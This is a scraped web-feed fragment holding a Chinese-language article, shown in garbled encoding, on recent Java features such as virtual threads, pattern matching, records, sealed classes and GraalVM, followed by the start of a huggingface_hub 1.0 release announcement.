                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Javaç”Ÿæ€æ–°çºªå…ƒï¼šè™šæ‹Ÿçº¿ç¨‹ã€æ¨¡å¼åŒ¹é…ä¸æœªæ¥çš„ç¼–ç¨‹èŒƒå¼</h2>
<p>Javaï¼Œè¿™é—¨æ‹¥æœ‰è¿‘30å¹´å†å²çš„ç¼–ç¨‹è¯­è¨€ï¼Œå§‹ç»ˆä¿æŒç€æƒŠäººçš„æ´»åŠ›å’Œåˆ›æ–°åŠ›ã€‚å®ƒä¸ä»…æ˜¯ä¼ä¸šçº§åº”ç”¨çš„åŸºçŸ³ï¼Œä¹Ÿåœ¨ä¸æ–­æ‹¥æŠ±ç°ä»£ç¼–ç¨‹èŒƒå¼ï¼Œä»¥åº”å¯¹äº‘åŸç”Ÿã€é«˜å¹¶å‘å’Œå¼€å‘æ•ˆç‡çš„æ–°æŒ‘æˆ˜ã€‚æœ¬æ–‡å°†å¸¦ä½ ä¸€è§ˆJavaç”Ÿæ€ä¸­æœ€æ¿€åŠ¨äººå¿ƒçš„æœ€æ–°æŠ€æœ¯å’Œæœªæ¥å‘å±•è¶‹åŠ¿ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€Project Loomï¼šå¼€å¯é«˜å¹¶å‘ç¼–ç¨‹æ–°èŒƒå¼</h3>
<p>ä¼ ç»ŸJavaå¹¶å‘æ¨¡å‹åŸºäºæ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼Œåˆ›å»ºå’Œä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬é«˜æ˜‚ï¼Œé™åˆ¶äº†åº”ç”¨çš„å¹¶å‘èƒ½åŠ›ã€‚Project Loomæ—¨åœ¨é€šè¿‡å¼•å…¥**è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰**å½»åº•è§£å†³è¿™ä¸€é—®é¢˜ã€‚</p>
<p>è™šæ‹Ÿçº¿ç¨‹æ˜¯ç”±JVMç®¡ç†çš„è½»é‡çº§çº¿ç¨‹ï¼Œå…¶åˆ›å»ºæˆæœ¬æä½ï¼ˆå‡ ä¹å¯ä»¥ç¬é—´åˆ›å»ºæ•°ç™¾ä¸‡ä¸ªï¼‰ï¼Œå¹¶ä¸”ç”±å°‘é‡å¹³å°çº¿ç¨‹ï¼ˆå³æ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼‰æ¥æ‰¿è½½å’Œè°ƒåº¦ã€‚è¿™ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿç”¨åŒæ­¥ã€é˜»å¡çš„ä»£ç é£æ ¼ç¼–å†™é«˜å¹¶å‘ã€é«˜ååé‡çš„åº”ç”¨ï¼Œè€Œæ— éœ€å¤æ‚çš„å¼‚æ­¥å›è°ƒæˆ–Reactiveç¼–ç¨‹æ¨¡å‹ã€‚</p>
<h4 data-id="heading-2">ä»£ç ç¤ºä¾‹ï¼šè™šæ‹Ÿçº¿ç¨‹ vs å¹³å°çº¿ç¨‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ä¼ ç»Ÿçš„çº¿ç¨‹æ± ï¼ˆå¹³å°çº¿ç¨‹ï¼‰</span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10_000</span>; i++) {
    executor.submit(() -&gt; {
        <span class="hljs-comment">// æ¨¡æ‹ŸI/Oæ“ä½œ</span>
        <span class="hljs-keyword">try</span> { Thread.sleep(<span class="hljs-number">1000</span>); } <span class="hljs-keyword">catch</span> (InterruptedException e) {}
        System.out.println(<span class="hljs-string">"Task completed"</span>);
    });
}

<span class="hljs-comment">// ä½¿ç”¨è™šæ‹Ÿçº¿ç¨‹</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10_000</span>; i++) {
        executor.submit(() -&gt; {
            <span class="hljs-comment">// åŒæ ·çš„I/Oæ“ä½œ</span>
            <span class="hljs-keyword">try</span> { Thread.sleep(<span class="hljs-number">1000</span>); } <span class="hljs-keyword">catch</span> (InterruptedException e) {}
            System.out.println(<span class="hljs-string">"Virtual Task completed"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        });
    }
}
</code></pre>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œä½¿ç”¨å›ºå®šçº¿ç¨‹æ± å¤„ç†1ä¸‡ä¸ªä»»åŠ¡ä¼šå› ä¸ºçº¿ç¨‹æ•°é‡é™åˆ¶è€Œæ’é˜Ÿæ‰§è¡Œï¼Œè€—æ—¶å¾ˆé•¿ã€‚è€Œä½¿ç”¨è™šæ‹Ÿçº¿ç¨‹ï¼Œæ‰€æœ‰ä»»åŠ¡å‡ ä¹å¯ä»¥åŒæ—¶å¼€å§‹æ‰§è¡Œï¼Œæå¤§åœ°æå‡äº†ååé‡ã€‚è‡ªJDK 21èµ·ï¼Œè™šæ‹Ÿçº¿ç¨‹å·²æˆä¸ºæ­£å¼ç‰¹æ€§ï¼Œæ˜¯æ„å»ºä¸‹ä¸€ä»£é«˜æ€§èƒ½æœåŠ¡çš„å…³é”®ã€‚</p>
<h3 data-id="heading-3">äºŒã€Project Valhallaï¼šé‡å¡‘Javaçš„å†…å­˜ä¸æ€§èƒ½æ¨¡å‹</h3>
<p>Project Valhallaçš„ç›®æ ‡æ˜¯é€šè¿‡å¼•å…¥<strong>å€¼ç±»å‹ï¼ˆValue Typesï¼‰<strong>å’Œ</strong>åŸå§‹ç±»ï¼ˆPrimitive Classesï¼‰</strong>ï¼Œæ¶ˆé™¤å¯¹è±¡å¤´å¸¦æ¥çš„å†…å­˜å¼€é”€å’Œé—´æ¥è®¿é—®çš„æ€§èƒ½æŸè€—ã€‚</p>
<p>åœ¨å½“å‰çš„Javaæ¨¡å‹ä¸­ï¼Œå³ä½¿æ˜¯ç®€å•çš„<code>Integer</code>æˆ–<code>Point</code>å¯¹è±¡ï¼Œä¹ŸåŒ…å«ä¸€ä¸ªå¯¹è±¡å¤´ï¼ˆé€šå¸¸12å­—èŠ‚ï¼‰ï¼Œè¿™åœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶ä¼šé€ æˆå·¨å¤§çš„å†…å­˜æµªè´¹å’Œç¼“å­˜æœªå‘½ä¸­ã€‚å€¼ç±»å‹å…è®¸æˆ‘ä»¬å°†è¿™äº›â€œçº¯æ•°æ®â€çš„å®ä¾‹åƒ<code>int</code>ä¸€æ ·å†…è”å­˜å‚¨ï¼Œæ²¡æœ‰èº«ä»½æ ‡è¯†ï¼Œä»è€Œè·å¾—æ¥è¿‘Cè¯­è¨€çš„å†…å­˜æ•ˆç‡å’Œæ€§èƒ½ã€‚</p>
<p>è™½ç„¶Valhallaå°šæœªå®Œå…¨å‘å¸ƒï¼Œä½†å…¶æ¦‚å¿µå·²ç»æ·±åˆ»å½±å“äº†Javaç¤¾åŒºå¯¹æ€§èƒ½ä¼˜åŒ–çš„æ€è€ƒã€‚</p>
<h3 data-id="heading-4">ä¸‰ã€è¯­æ³•ç³–è¿›åŒ–ï¼šæ›´ç®€æ´ã€æ›´å®‰å…¨çš„ä»£ç </h3>
<p>Javaè¯­è¨€æœ¬èº«ä¹Ÿåœ¨æŒç»­è¿›åŒ–ï¼Œå¼•å…¥äº†è®¸å¤šæå‡å¼€å‘ä½“éªŒçš„è¯­æ³•ç‰¹æ€§ã€‚</p>
<h4 data-id="heading-5">1. æ¨¡å¼åŒ¹é…ï¼ˆPattern Matchingï¼‰</h4>
<p>ä»JDK 14å¼€å§‹å¼•å…¥å¹¶åœ¨åç»­ç‰ˆæœ¬ä¸­å®Œå–„çš„<code>instanceof</code>æ¨¡å¼åŒ¹é…ï¼Œä»¥åŠJDK 21ä¸­é¢„è§ˆçš„<code>switch</code>æ¨¡å¼åŒ¹é…ï¼Œè®©ç±»å‹æ£€æŸ¥å’Œè§£æ„å˜å¾—å¼‚å¸¸ä¼˜é›…ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// JDK 14+ çš„ instanceof æ¨¡å¼åŒ¹é…</span>
<span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String s &amp;&amp; s.length() &gt; <span class="hljs-number">5</span>) {
    System.out.println(s.toUpperCase());
}

<span class="hljs-comment">// JDK 21+ çš„ switch æ¨¡å¼åŒ¹é…ï¼ˆé¢„è§ˆç‰¹æ€§ï¼‰</span>
<span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (obj) {
    <span class="hljs-keyword">case</span> Integer i -&gt; String.format(<span class="hljs-string">"int %d"</span>, i);
    <span class="hljs-keyword">case</span> String s when s.length() &gt; <span class="hljs-number">0</span> -&gt; String.format(<span class="hljs-string">"String of length %d"</span>, s.length());
    <span class="hljs-keyword">case</span> <span class="hljs-literal">null</span> -&gt; <span class="hljs-string">"null"</span>;
    <span class="hljs-keyword">default</span> -&gt; obj.toString();
};
</code></pre>
<h4 data-id="heading-6">2. Recordç±»</h4>
<p>Recordæ˜¯JDK 14å¼•å…¥çš„ç”¨äºå£°æ˜â€œçº¯æ•°æ®è½½ä½“â€ç±»çš„ç®€æ´æ–¹å¼ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆ<code>equals</code>, <code>hashCode</code>, <code>toString</code>ä»¥åŠ<code>getter</code>æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">record</span> <span class="hljs-title class_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">30</span>);
System.out.println(user.name()); <span class="hljs-comment">// è‡ªåŠ¨ç”Ÿæˆçš„getter</span>
</code></pre>
<h4 data-id="heading-7">3. å¯†å°ç±»ï¼ˆSealed Classesï¼‰</h4>
<p>å¯†å°ç±»ï¼ˆJDK 17æ­£å¼å‘å¸ƒï¼‰å…è®¸ä½ ç²¾ç¡®æ§åˆ¶å“ªäº›ç±»å¯ä»¥ç»§æ‰¿æˆ–å®ç°æŸä¸ªçˆ¶ç±»/æ¥å£ï¼Œè¿™å¯¹äºæ„å»ºé¢†åŸŸæ¨¡å‹å’Œç¡®ä¿<code>switch</code>è¡¨è¾¾å¼çš„ç©·å°½æ€§éå¸¸æœ‰ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">permits</span> Circle, Rectangle {}
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Shape</span> { <span class="hljs-comment">/* ... */</span> }
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Shape</span> { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<h3 data-id="heading-8">å››ã€GraalVMä¸Native Imageï¼šè¿ˆå‘AOTç¼–è¯‘</h3>
<p>GraalVMæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„é€šç”¨è™šæ‹Ÿæœºï¼Œå…¶æœ€å¼•äººæ³¨ç›®çš„ç‰¹æ€§ä¹‹ä¸€æ˜¯èƒ½å¤Ÿå°†Javaåº”ç”¨ç¨‹åºæå‰ç¼–è¯‘ï¼ˆAOTï¼‰æˆç‹¬ç«‹çš„æœ¬åœ°å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆNative Imageï¼‰ã€‚è¿™å¸¦æ¥äº†å¯åŠ¨é€Ÿåº¦çš„é£è·ƒï¼ˆæ¯«ç§’çº§ï¼‰å’Œæä½çš„å†…å­˜å ç”¨ï¼Œéå¸¸é€‚åˆå¾®æœåŠ¡ã€Serverlessï¼ˆFaaSï¼‰ç­‰åœºæ™¯ã€‚</p>
<p>å°½ç®¡ç›®å‰åœ¨åå°„ã€åŠ¨æ€ä»£ç†ç­‰æ–¹é¢ä»æœ‰ä¸€äº›é™åˆ¶ï¼Œä½†GraalVMç”Ÿæ€æ­£åœ¨å¿«é€Ÿå‘å±•ï¼ŒSpring Nativeç­‰æ¡†æ¶ä¹Ÿæä¾›äº†è‰¯å¥½çš„æ”¯æŒã€‚</p>
<h3 data-id="heading-9">ç»“è¯­</h3>
<p>Javaç”Ÿæ€æ­£å¤„åœ¨ä¸€ä¸ªå‰æ‰€æœªæœ‰çš„åˆ›æ–°é«˜å³°æœŸã€‚ä»åº•å±‚çš„å¹¶å‘æ¨¡å‹ï¼ˆLoomï¼‰ã€å†…å­˜æ¨¡å‹ï¼ˆValhallaï¼‰ï¼Œåˆ°ä¸Šå±‚çš„è¯­è¨€è¯­æ³•ï¼ˆRecords, Sealed Classes, Pattern Matchingï¼‰ï¼Œå†åˆ°è¿è¡Œæ—¶çš„é©æ–°ï¼ˆGraalVMï¼‰ï¼Œæ¯ä¸€é¡¹æŠ€æœ¯éƒ½åœ¨ä¸ºå¼€å‘è€…æä¾›æ›´å¼ºå¤§ã€æ›´é«˜æ•ˆã€æ›´ç®€æ´çš„å·¥å…·ã€‚å¯¹äºJavaå­¦ä¹ è€…è€Œè¨€ï¼Œç´§è·Ÿè¿™äº›è¶‹åŠ¿ï¼Œä¸ä»…èƒ½å†™å‡ºæ›´å¥½çš„ä»£ç ï¼Œæ›´èƒ½æ´å¯Ÿæœªæ¥è½¯ä»¶å·¥ç¨‹çš„å‘å±•æ–¹å‘ã€‚æ‹¥æŠ±å˜åŒ–ï¼ŒJavaçš„æœªæ¥ä¾ç„¶å…‰æ˜ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[huggingface_hub 1.0 æ­£å¼ç‰ˆç°å·²å‘å¸ƒï¼šå¼€æºæœºå™¨å­¦ä¹ åŸºç¡€äº”å‘¨å¹´å›é¡¾]]></title>    <link>https://juejin.cn/post/7582846276506730534</link>    <guid>https://juejin.cn/post/7582846276506730534</guid>    <pubDate>2025-12-13T08:40:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582846276506730534" data-draft-id="7582875640308170802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="huggingface_hub 1.0 æ­£å¼ç‰ˆç°å·²å‘å¸ƒï¼šå¼€æºæœºå™¨å­¦ä¹ åŸºç¡€äº”å‘¨å¹´å›é¡¾"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-13T08:40:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HuggingFace"/> <meta itemprop="url" content="https://juejin.cn/user/611789528634712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            huggingface_hub 1.0 æ­£å¼ç‰ˆç°å·²å‘å¸ƒï¼šå¼€æºæœºå™¨å­¦ä¹ åŸºç¡€äº”å‘¨å¹´å›é¡¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/611789528634712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HuggingFace
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T08:40:38.000Z" title="Sat Dec 13 2025 08:40:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ç®€è¦æ€»ç»“ï¼š</strong> ç»è¿‡äº”å¹´çš„æŒç»­å¼€å‘ï¼Œ<code>huggingface_hub</code> å‘å¸ƒ v1.0 æ­£å¼ç‰ˆï¼è¿™ä¸€é‡Œç¨‹ç¢‘æ ‡å¿—ç€è¿™ä¸ªåº“çš„æˆç†Ÿä¸ç¨³å®šã€‚å®ƒå·²æˆä¸º Python ç”Ÿæ€ä¸­æ”¯æ’‘ <strong>20 ä¸‡ä¸ªä¾èµ–åº“</strong> çš„æ ¸å¿ƒç»„ä»¶ï¼Œå¹¶æä¾›è®¿é—®è¶…è¿‡ <strong>200 ä¸‡å…¬å¼€æ¨¡å‹</strong>ã€<strong>50 ä¸‡å…¬å¼€æ•°æ®é›†</strong> å’Œ <strong>100 ä¸‡ Space åº”ç”¨</strong> çš„åŸºç¡€èƒ½åŠ›ã€‚æœ¬æ¬¡æ›´æ–°åŒ…å«ä¸ºæ”¯æŒæœªæ¥åå¹´å¼€æºæœºå™¨å­¦ä¹ ç”Ÿæ€è€Œåšå‡ºçš„é‡å¤§å˜æ›´ï¼Œç”±è¿‘ 300 ä½è´¡çŒ®è€…å’Œæ•°ç™¾ä¸‡ç”¨æˆ·å…±åŒæ¨åŠ¨å‘å±•ã€‚</p>
<p><strong>ğŸš€ å¼ºçƒˆå»ºè®®å°½å¿«å‡çº§è‡³ v1.0ï¼Œä»¥ä½“éªŒæ›´ä¼˜æ€§èƒ½å’Œå…¨æ–°åŠŸèƒ½ã€‚</strong></p>
<pre><code class="hljs language-bash" lang="bash">pip install --upgrade huggingface_hub
</code></pre>
<p>æ­¤æ¬¡é‡å¤§ç‰ˆæœ¬æ›´æ–°åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>httpx</code> ä½œä¸ºæ–°åç«¯è¯·æ±‚åº“ï¼›</li>
<li>å…¨æ–°è®¾è®¡çš„ <code>hf</code> å‘½ä»¤è¡Œå·¥å…·ï¼ˆå–ä»£å·²å¼ƒç”¨çš„ <code>huggingface-cli</code>ï¼‰ï¼Œé‡‡ç”¨ Typer æ„å»ºï¼ŒåŠŸèƒ½æ›´åŠ ä¸°å¯Œï¼›</li>
<li>æ–‡ä»¶ä¼ è¾“å…¨é¢è¿ç§»è‡³ <code>hf_xet</code>ï¼Œå½»åº•æ·˜æ±°æ—§çš„ <code>hf_transfer</code> å·¥å…·ã€‚</li>
</ul>
